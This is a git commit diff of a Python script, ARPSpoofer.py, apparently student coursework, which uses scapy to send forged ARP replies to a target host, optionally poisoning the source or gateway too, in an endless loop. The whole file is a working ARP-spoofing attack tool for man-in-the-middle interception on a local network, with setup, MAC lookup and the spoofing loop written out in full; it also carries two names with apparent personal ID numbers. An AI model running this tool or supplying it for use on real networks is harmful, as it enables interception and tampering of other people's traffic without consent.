2027312039fa5dd57d6ef8dd653d8927695bcd99
Yedidia Bakuradze <yedidiadev@gmail.com>
2025-10-29 15:07:59 +0200

    final version of the ARP spoofer, issues fixed and names added

--- ARPSpoofer.py
+++ ARPSpoofer.py
@@ -1,3 +1,6 @@
+# Yedidia Bakuradze: 332461854
+# Meir Crombie: 214736688
+
 import sys
 import subprocess
 from scapy.all import ARP, Ether, sendp,srp
@@ -15,54 +18,78 @@ optional arguments:
     -gw should GW be attacked as well
     -t TARGET, --target TARGET IP of target
 """
-broadcast_mac = "FF:FF:FF:FF:FF:FF:FF:FF"
+broadcast_mac = "FF:FF:FF:FF:FF:FF"
 
-ip_config = None
-gw_ip = None
-gw_mac = None
+
+
 src_ip = None
-src_iface = None
-
-should_attack_gateway = False
-
 dst_ip = None
-dst_mac = None
+
+my_mac = None
+
+config = None
+iface = None
+full_duplex = False
 delay = 0
 
-
-
 def send_who_has():
+    global my_mac,iface
+    
+    # Set up source's MAC address
     src_mac = get_mac_by_ip(src_ip)
     if not src_mac:
-        print(f"Error, mac not found for {src_ip}")
+        print(f"Unable to fetch ${src_ip}'s MAC address")
         return
     
-    pack = ARP(op=2,pdst=dst_ip,hwdst=dst_mac,psrc=src_ip,hwsrc=src_mac)
-    sendp(pack)
+    # Set up destination's MAC address
+    dst_mac = get_mac_by_ip(dst_ip)
+    if not dst_mac:
+        print(f"Unable to fetch ${src_ip}'s MAC address")
+        return
+    
+    # Send is-has ARP packets
+    pack =  Ether(dst=dst_mac, src=my_mac) / ARP(
+        op=2,
+        pdst=dst_ip,
+        hwdst=dst_mac,
+        psrc=src_ip,
+        hwsrc=my_mac
+    )
+    
+    sendp(pack,iface=iface,verbose=False)
+    print(f"The destination is under attack! | Attacking: IP: {dst_ip} MAC: {dst_mac} With: {iface} As: IP: {src_ip} MAC: {my_mac}")
 
     # Tell gw as well
-    if should_attack_gateway:
-        pack = ARP(op=2,pdst=gw_ip,hwdst=gw_mac,psrc=src_ip,hwsrc=src_mac)
-        sendp(pack)
+    if full_duplex:
+        pack = Ether(dst=src_mac, src=my_mac) / ARP(
+            op=2,
+            pdst=src_ip,
+            hwdst=src_mac,
+            psrc=dst_ip,
+            hwsrc=my_mac
+        )
+        print(f"The source is under attack! | Attacking: IP: {src_ip} MAC: {src_mac} With: ${iface} As: IP: {dst_ip} MAC: {dst_mac}")
+        sendp(pack,iface=iface,verbose=False)
+
 
 def get_mac_by_ip(ip):
     global broadcast_mac
     arp = ARP(op=1,pdst=ip)
     broadcast = Ether(dst=broadcast_mac)
     request_broadcast = broadcast / arp
-    res, _ = srp(request_broadcast, timeout=1, verbose=False, iface=src_iface)
+    res, _ = srp(request_broadcast, timeout=1, verbose=False, iface=iface)
     return res[0][1].hwsrc if res else None
 
 
 def init_state(args):
-    global src_iface, src_ip,delay,should_attack_gateway,dst_ip,gw_ip,gw_mac
-    while len(args) > 0:
+    global iface, src_ip, delay, full_duplex, dst_ip, my_mac, src_mac,ip_config,dst_mac
 
+    while len(args) > 0:
         # IFACE Set
         if args[0] == '-i' or args[0] == '--iface' :
             # Run the ifconfig command, and search via Regex if interface exsits
-            src_iface = args[1]
-            if not src_iface:  
+            iface = args[1]
+            if not iface:  
                 print("You must specify the value of the new IFACE")
                 exit()
             args = args[2:]
@@ -79,7 +106,7 @@ def init_state(args):
 
         # Delay parameter
         if args[0] == '-d' or args[0] == '--delay' :
-            delay = args[1]
+            delay = int(args[1])
             if not delay:  
                 print("You must specify the value of the delay")
                 exit()
@@ -89,7 +116,7 @@ def init_state(args):
         
         # Should attack gateway as well?
         if args[0] == '-gw' :
-            should_attack_gateway = True
+            full_duplex = True
             args = args[1:]
             continue
 
@@ -103,60 +130,50 @@ def init_state(args):
             args = args[2:]
             continue
     
-    if not src_iface:
+
+    # Set IFACE value if None to default
+    if not iface:
         ip_config = subprocess.run("ip route show default",shell=True, capture_output=True, text=True, check=True).stdout.split()
-        src_iface = ip_config[4] # Default is the default
+        iface = ip_config[4] 
 
-    try:
-        gw_ip = subprocess.run(f"ip route show dev {src_iface} | grep default",shell=True, capture_output=True, text=True, check=True).stdout.split()[2]
-        
-        if not gw_ip:
-            print("error")
-            exit()
+    # Set the attacker's MAC address
+    my_mac = subprocess.run(f"ip link show dev {iface} | grep link | sed 's/    //'",shell=True, capture_output=True, text=True, check=True).stdout.split()[1]
+    
+    if not src_ip:
+        src_ip = subprocess.run(f"ip route show dev {iface} | grep default",shell=True, capture_output=True, text=True, check=True).stdout.split()[2]
 
-        gw_mac = subprocess.run(f"ip link show {src_iface} | grep link | sed 's/    //' ",shell=True, capture_output=True, text=True, check=True).stdout.split()[2]
-
-        if not gw_mac:
-            print("error")
-            exit()
-
-        if not src_ip:
-            src_ip = gw_ip
-    except Exception:
-        print("error")
-        exit()
+    dst_mac = get_mac_by_ip(dst_ip)
+    src_mac = get_mac_by_ip(src_ip)
     
     # Run the attack
-    print (f"IFACE {src_iface}")
-    print (f"SRC {src_ip}")
-    print (f"Delay {delay}")
-    print (f"GW {should_attack_gateway}")
-    print (f"TARGET {dst_ip}")
+    print("=========================")
+    print("Preforming ARP spoofing ...")
+    if full_duplex:
+        print(f"SRC: {src_ip} / {src_mac} ------> Attacker: {my_mac} ------> Des: {dst_ip} / {dst_mac}")
     
+    print(f"SRC: {src_ip} / {src_mac} <------ Attacker: {my_mac} <------ Des: {dst_ip} / {dst_mac}")
+    print(f"Interface: {iface}")
+    print(f"Delay: {delay}")
+    print("=========================")
+
+ 
 def main():
-    print(sys.argv)
-    # if len(sys.argv) <= 1: exit()
-    args = sys.argv
-    args = args[1:]
-    args = ['-i', 'eth0', '-t', '10.7.11.205', '-s', '10.7.15.254', '-d', '1']
+    if len(sys.argv) <= 1: exit()
+    args = sys.argv[1:]
     
-    # Help
-    if args[0] == '-h' or args[0] == '--help' :
+    # Help printer
+    if args[0] == '-h' or args[0] == '--help':
         print(help_msg)
         exit()
 
-
-    global ip_config,src_ip,src_iface
-    ip_config = subprocess.run("ip route show default",shell=True, capture_output=True, text=True, check=True).stdout.split()
-    src_ip = ip_config[2] # Default is gw of iface
-    src_iface = ip_config[4] # Default is the default
+    # Settuing up the parameters
     init_state(args)
     
     if dst_ip == None:
         print("Please specify the target value")
         exit()
     
-    
+    # The attack
     while True:
         send_who_has()
         sleep(delay)
